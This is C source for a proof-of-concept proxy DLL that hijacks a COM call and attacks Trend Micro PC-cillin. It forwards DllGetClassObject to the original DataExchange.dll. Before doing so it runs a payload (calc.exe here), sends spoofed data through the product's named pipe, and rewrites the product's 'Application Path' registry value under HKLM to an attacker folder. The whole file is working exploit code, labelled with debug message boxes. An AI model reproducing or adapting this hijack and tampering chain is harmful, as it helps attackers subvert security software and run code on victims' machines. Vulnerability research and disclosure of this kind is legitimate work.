#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\OIPC_TMLISTEN_PIPE_2218EBAB_63F8_49E4_930C_AF69E77928AF"
#define REG_PATH "SOFTWARE\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion\\Misc"
#define ORIGINAL_COM_DLL "C:\\Windows\\System32\\DataExchange.dll"

// Proxy Original DLL
HMODULE hOrigDLL = NULL;
typedef HRESULT(WINAPI* tDllGetClassObject)(REFCLSID, REFIID, LPVOID*);
tDllGetClassObject pDllGetClassObject = NULL;

// Function to modify registry
void ModifyRegistry() {
    MessageBoxA(NULL, "Modifying Registry...", "DEBUG", MB_OK);
    HKEY hKey;
    const char* newPath = "C:\\poc\\AAAAAAAA\\";

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, REG_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Application Path", 0, REG_SZ, (BYTE*)newPath, (DWORD)(strlen(newPath) + 1));
        RegCloseKey(hKey);
        MessageBoxA(NULL, "Registry Modified Successfully!", "DEBUG", MB_OK);
    } else {
        MessageBoxA(NULL, "Failed to Modify Registry!", "ERROR", MB_ICONERROR);
    }
}

// Function to communicate with Named Pipe
void ReplayNamedPipeTraffic() {
    MessageBoxA(NULL, "Replaying Named Pipe Traffic...", "DEBUG", MB_OK);
    HANDLE hPipe;
    DWORD bytesWritten;
    char fakeData[] = "SOFTWARE\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion\\Application Path=C:\\poc\\AAAAAAAA\\";

    hPipe = CreateFileA(PIPE_NAME, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe != INVALID_HANDLE_VALUE) {
        WriteFile(hPipe, fakeData, sizeof(fakeData), &bytesWritten, NULL);
        CloseHandle(hPipe);
        MessageBoxA(NULL, "Named Pipe Traffic Replayed!", "DEBUG", MB_OK);
    } else {
        MessageBoxA(NULL, "Failed to Open Named Pipe!", "ERROR", MB_ICONERROR);
    }
}

// Function to execute payload (calc.exe for testing)
void ExecutePayload() {
    MessageBoxA(NULL, "Executing Payload: calc.exe", "DEBUG", MB_OK);
    ShellExecuteA(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);
}

// Load the original COM DLL and proxy all function calls
void LoadOriginalDLL() {
    if (!hOrigDLL) {
        hOrigDLL = LoadLibraryA(ORIGINAL_COM_DLL);
        if (!hOrigDLL) {
            MessageBoxA(NULL, "Failed to load original COM DLL", "ERROR", MB_ICONERROR);
            return;
        }
    }
    // Load original function addresses
    pDllGetClassObject = (tDllGetClassObject)GetProcAddress(hOrigDLL, "DllGetClassObject");
}

// Proxy COM calls (Now matches the reference screenshot logic)
STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID FAR* ppv) {
    MessageBoxA(NULL, "Hijacked COM Call - DllGetClassObject Triggered!", "DEBUG", MB_OK);

    // Execute Payload before calling the original COM function
    ExecutePayload();
    ReplayNamedPipeTraffic();
    ModifyRegistry();

    // Ensure original function pointer is valid
    if (!pDllGetClassObject) {
        MessageBoxA(NULL, "Original DllGetClassObject Not Found!", "ERROR", MB_ICONERROR);
        return S_FALSE;
    }

    // Forward the call to the original COM function
    return pDllGetClassObject(rclsid, riid, ppv);
}

// Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "DLL Loaded into Process!", "DEBUG", MB_OK);
        LoadOriginalDLL();  // Load once here, not inside DllGetClassObject()
    }
    return TRUE;
}

